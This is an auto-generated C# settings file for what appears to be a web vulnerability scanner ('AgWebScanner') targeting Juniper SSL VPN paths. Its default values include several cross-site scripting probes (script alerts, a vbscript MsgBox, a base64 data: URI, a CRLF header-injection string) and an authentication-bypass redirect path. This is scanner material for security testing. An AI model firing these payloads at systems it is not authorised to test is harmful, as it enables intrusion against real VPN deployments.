﻿//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.269
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace AgWebScanner.Properties {
    
    
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "10.0.0.0")]
    internal sealed partial class Settings : global::System.Configuration.ApplicationSettingsBase {
        
        private static Settings defaultInstance = ((Settings)(global::System.Configuration.ApplicationSettingsBase.Synchronized(new Settings())));
        
        public static Settings Default {
            get {
                return defaultInstance;
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("Settings.xml")]
        public string SettingsFile {
            get {
                return ((string)(this["SettingsFile"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("031CC418-C039-11E0-A1F6-539E4824019B")]
        public string Key {
            get {
                return ((string)(this["Key"]));
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("False")]
        public bool Registered {
            get {
                return ((bool)(this["Registered"]));
            }
            set {
                this["Registered"] = value;
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("\\DefaultChecks")]
        public string DefaultChecksFolder {
            get {
                return ((string)(this["DefaultChecksFolder"]));
            }
        }
        
        [global::System.Configuration.UserScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("QuickScanSettings.xml")]
        public string QuickScanSettings {
            get {
                return ((string)(this["QuickScanSettings"]));
            }
            set {
                this["QuickScanSettings"] = value;
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/auth/url_$URLID/welcome.cgi?")]
        public string CheckByIdUrlPart {
            get {
                return ((string)(this["CheckByIdUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/auth/url_default/welcome.cgi?p=logout&c=37&u=</script><script>alert(1)</s" +
            "cript>")]
        public string ScriptingAttacksUrlPartDefault {
            get {
                return ((string)(this["ScriptingAttacksUrlPartDefault"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/auth/remediate.cgi?action=&step=preauth")]
        public string FirstRemediateCgiUrlPart {
            get {
                return ((string)(this["FirstRemediateCgiUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/auth/remediate.cgi?step=preauth")]
        public string SecondRemediateCgiUrlPart {
            get {
                return ((string)(this["SecondRemediateCgiUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-cached/setup/JuniperSetupSP1.cab")]
        public string FirstFileUrlPart {
            get {
                return ((string)(this["FirstFileUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-cached/sc/JuniperSetupClientInstaller.exe")]
        public string SecondFileUrlPart {
            get {
                return ((string)(this["SecondFileUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/meeting/login_meeting.cgi?mid=DIMITRY")]
        public string Meeting {
            get {
                return ((string)(this["Meeting"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("p=logout&c=37&u=</script><script>alert(1)</script>")]
        public string ScriptingAttackUrlPartCustom {
            get {
                return ((string)(this["ScriptingAttackUrlPartCustom"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/download/?url=/dana/home/launch.cgi?url=http://www.example.com/")]
        public string AuthByPassUrlPart {
            get {
                return ((string)(this["AuthByPassUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/meeting/meeting_testresult.cgi?redir=%2Fdana-na%2Fmeeting%2Flogin_meeting" +
            ".cgi%22%3E%3Cscript%3Ealert(999)%3C/script%3E&java=1 ")]
        public string XssVulnerabilityUrlPart {
            get {
                return ((string)(this["XssVulnerabilityUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana/fb/smb/rd.cgi?si=%22)%3balert(999)%3b</script>")]
        public string CXssVulnerabilityUrlPart {
            get {
                return ((string)(this["CXssVulnerabilityUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana/fb/smb/wu.cgi?dir=foo%22><script>alert(999)%3b</script>")]
        public string DXssVulnerabilityUrlPart {
            get {
                return ((string)(this["DXssVulnerabilityUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/download/?url=/dana/fb/smb/wfmd.cgi?file=AAAAAAA%0aRefresh:%201,URL=javas" +
            "cript:alert(999)%0aFoo:%0a%0a")]
        public string EXssVulnerabilityUrlPart {
            get {
                return ((string)(this["EXssVulnerabilityUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/download/?url=/dana/home/launch.cgi?url=vbscript:MsgBox(%2522999%2522)")]
        public string FXssVulnerabilityUrlPart {
            get {
                return ((string)(this["FXssVulnerabilityUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/download/?url=/dana/home/launch.cgi?url=data:text/html%3bbase64,PHNjcmlwd" +
            "D5hbGVydCg5OTkpPC9zY3JpcHQ+")]
        public string GBXssVulnerabilityUrlPart {
            get {
                return ((string)(this["GBXssVulnerabilityUrlPart"]));
            }
        }
        
        [global::System.Configuration.ApplicationScopedSettingAttribute()]
        [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
        [global::System.Configuration.DefaultSettingValueAttribute("dana-na/auth/url_admin/welcome.cgi")]
        public string AdminAccessUrlPart {
            get {
                return ((string)(this["AdminAccessUrlPart"]));
            }
        }
    }
}
